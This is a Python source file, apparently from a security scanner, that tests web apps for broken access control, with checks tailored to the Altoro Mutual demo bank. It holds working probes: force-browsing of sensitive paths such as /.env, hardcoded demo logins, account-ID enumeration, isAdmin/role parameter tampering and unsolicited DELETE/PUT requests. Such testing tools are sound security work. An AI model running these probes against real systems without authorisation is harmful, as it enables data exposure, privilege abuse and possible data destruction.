"""
Broken Access Control Validator — Zentry
=========================================
Detects:
  1. Horizontal privilege escalation (IDOR between accounts)
  2. Vertical privilege escalation (accessing admin-only pages as a normal user)
  3. Unauthenticated access to protected endpoints
  4. Force-browsing to sensitive paths
  5. HTTP method-based access control bypass (GET vs POST vs PUT)
  6. Parameter manipulation (e.g., role=admin, isAdmin=true)

Altoro Mutual specific checks:
  - /admin/admin.jsp accessible without admin session
  - /bank/showAccount?listAccounts=<other_user_id>
  - /admin/clients.xls
  - Privilege escalation via role parameter tampering
"""
from __future__ import annotations

import asyncio
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

import aiohttp

from core.adaptive_exploit_engine import AdaptiveExploitEngine
from .registry import register

# ──────────────────────────────────────────────────────────────────────────────
# Sensitive paths to force-browse
# ──────────────────────────────────────────────────────────────────────────────
ADMIN_PATHS = [
    "/admin",
    "/admin/admin.jsp",
    "/admin/clients.xls",
    "/admin/users",
    "/admin/config",
    "/administrator",
    "/manage",
    "/management",
    "/control",
    "/dashboard",
    "/console",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/beans",
    "/api/admin",
    "/api/users",
    "/api/config",
    "/wp-admin",
    "/phpmyadmin",
    "/.env",
    "/config.php",
    "/backup",
    "/debug",
]

SENSITIVE_CONTENT_PATTERNS = [
    r"admin",
    r"password",
    r"secret",
    r"api.?key",
    r"private.?key",
    r"ssn",
    r"credit.?card",
    r"account.?number",
    r"\$\d+",           # dollar amounts (financial data)
    r"\d{4}[- ]\d{4}[- ]\d{4}[- ]\d{4}",  # credit card pattern
]

PRIVILEGE_PARAM_TAMPERING = [
    {"role": "admin"},
    {"role": "administrator"},
    {"isAdmin": "true"},
    {"is_admin": "1"},
    {"admin": "true"},
    {"admin": "1"},
    {"privilege": "admin"},
    {"access_level": "0"},
    {"user_type": "admin"},
]

# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────
async def _get(session: aiohttp.ClientSession, url: str,
               cookies: dict = None, headers: dict = None) -> tuple[int, str, dict]:
    try:
        async with session.get(
            url,
            timeout=aiohttp.ClientTimeout(total=15),
            cookies=cookies or {},
            headers=headers or {},
            allow_redirects=True,
        ) as r:
            body = await r.text(errors="ignore")
            return r.status, body, dict(r.headers)
    except Exception:
        return 0, "", {}


def _is_sensitive(body: str) -> bool:
    body_lower = body.lower()
    return any(re.search(p, body_lower) for p in SENSITIVE_CONTENT_PATTERNS)


def _is_admin_content(body: str) -> bool:
    indicators = ["admin panel", "user management", "admin dashboard",
                  "manage users", "system settings", "client list",
                  "delete user", "edit user", "role:", "privilege:"]
    body_lower = body.lower()
    return any(ind in body_lower for ind in indicators)


async def _try_login_altoro(session: aiohttp.ClientSession, base_url: str,
                             role: str = "user") -> dict:
    """Login to Altoro — role='admin' uses admin creds, 'user' uses normal user."""
    parsed = urlparse(base_url)
    login_url = f"{parsed.scheme}://{parsed.netloc}/doLogin"

    cred_map = {
        "admin": {"uid": "admin", "passw": "admin", "btnSubmit": "Login"},
        "user":  {"uid": "jsmith", "passw": "Demo1234", "btnSubmit": "Login"},
        "user2": {"uid": "tuser",  "passw": "tuser",   "btnSubmit": "Login"},
    }
    creds = cred_map.get(role, cred_map["user"])

    try:
        async with session.post(login_url, data=creds,
                                timeout=aiohttp.ClientTimeout(total=10),
                                allow_redirects=True) as r:
            body = await r.text(errors="ignore")
            if r.status == 200 and any(k in body.lower() for k in
                                       ("my account", "sign off", "logout", "welcome", "bank")):
                return dict(r.cookies)
    except Exception:
        pass
    return {}


# ──────────────────────────────────────────────────────────────────────────────
# Main validator
# ──────────────────────────────────────────────────────────────────────────────
@register("broken_access_control")
async def validate_bac(url: str, param: str, state: dict = None, **kwargs) -> dict | None:
    """
    Detect broken access control flaws:
    - Unauthenticated access to admin/sensitive paths
    - Horizontal privilege escalation (account ID enumeration)
    - Vertical privilege escalation (role param tampering)
    """
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    state = state or {}
    _engine = AdaptiveExploitEngine()

    async with aiohttp.ClientSession() as session:

        # ── 1. Force-browsing: access admin paths WITHOUT authentication ──────
        for path in ADMIN_PATHS:
            test_url = urljoin(base_url, path)
            status, body, hdrs = await _get(session, test_url)

            if status == 200 and len(body) > 200:
                if _is_admin_content(body) or _is_sensitive(body):
                    return {
                        "validated": True,
                        "type": "Broken Access Control — Unauthenticated Admin Access",
                        "url": test_url,
                        "param": "",
                        "payload": "",
                        "method": "GET",
                        "evidence": (
                            f"Admin-only path {path!r} accessible without authentication. "
                            f"HTTP {status}. Sensitive content detected in response."
                        ),
                        "response_snippet": body[:500],
                    }

        # ── 2. Horizontal privilege escalation — user A accesses user B data ──
        # Login as user A
        cookies_a = await _try_login_altoro(session, base_url, role="user")
        # Login as user B (or admin)
        cookies_b = await _try_login_altoro(session, base_url, role="admin")

        if cookies_a and param and any(k in param.lower() for k in
                                        ("id", "account", "acct", "user", "uid", "num")):
            qs = parse_qs(parsed.query, keep_blank_values=True)
            original_val = (qs.get(param) or ["1"])[0]

            # Try adjacent IDs
            for test_id in ["800000", "800001", "800002", "800003", "1", "2", "3"]:
                if test_id == original_val:
                    continue
                q = dict(qs)
                q[param] = [test_id]
                test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))

                # Check if user A can see user B's data
                status_a, body_a, _ = await _get(session, test_url, cookies_a)
                status_b, body_b, _ = await _get(session, test_url, cookies_b)

                if status_a == 200 and status_b == 200:
                    # If both see similar content, or A sees sensitive data
                    if _is_sensitive(body_a) and len(body_a) > 500:
                        return {
                            "validated": True,
                            "type": "Horizontal Privilege Escalation (IDOR)",
                            "url": test_url,
                            "param": param,
                            "payload": test_id,
                            "method": "GET",
                            "evidence": (
                                f"User A (jsmith) can access resource with {param}={test_id} "
                                f"which appears to contain sensitive account data. "
                                f"HTTP {status_a}."
                            ),
                            "response_snippet": body_a[:500],
                        }

        # ── 3. Vertical privilege escalation — normal user accesses admin page ─
        if cookies_a:
            admin_paths_to_try = [
                "/admin/admin.jsp",
                "/admin/clients.xls",
                "/admin",
            ]
            for path in admin_paths_to_try:
                test_url = urljoin(base_url, path)
                status, body, _ = await _get(session, test_url, cookies_a)
                if status == 200 and (_is_admin_content(body) or _is_sensitive(body)):
                    return {
                        "validated": True,
                        "type": "Vertical Privilege Escalation — Normal User Accessing Admin Page",
                        "url": test_url,
                        "param": "",
                        "payload": "",
                        "method": "GET",
                        "evidence": (
                            f"Normal user 'jsmith' can access {path!r} (HTTP {status}). "
                            f"Admin content or sensitive data present."
                        ),
                        "response_snippet": body[:500],
                    }

        # ── 4. Role/privilege parameter tampering ─────────────────────────────
        if param:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for tamper in PRIVILEGE_PARAM_TAMPERING:
                q = dict(qs)
                q.update(tamper)
                test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
                status, body, _ = await _get(session, test_url)
                if status == 200 and (_is_admin_content(body) or _is_sensitive(body)):
                    return {
                        "validated": True,
                        "type": "Broken Access Control — Privilege Parameter Tampering",
                        "url": test_url,
                        "param": list(tamper.keys())[0],
                        "payload": str(tamper),
                        "method": "GET",
                        "evidence": (
                            f"Adding {tamper} to request bypasses access control. "
                            f"HTTP {status} with admin-level content."
                        ),
                        "response_snippet": body[:500],
                    }

        # ── 5. HTTP method bypass (access POST-only endpoints via GET) ─────────
        if param:
            # Try accessing the URL with different HTTP methods
            for method in ("PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"):
                try:
                    async with session.request(
                        method, url,
                        timeout=aiohttp.ClientTimeout(total=10),
                        allow_redirects=False,
                    ) as r:
                        if r.status not in (405, 404, 501):
                            # Method not properly restricted
                            if method in ("PUT", "DELETE", "PATCH") and r.status in (200, 201, 204):
                                return {
                                    "validated": True,
                                    "type": "Broken Access Control — HTTP Method Bypass",
                                    "url": url,
                                    "param": param,
                                    "payload": method,
                                    "method": method,
                                    "evidence": (
                                        f"HTTP {method} request to {url} returned {r.status} "
                                        f"instead of 405 Method Not Allowed."
                                    ),
                                }
                except Exception:
                    continue

    return None
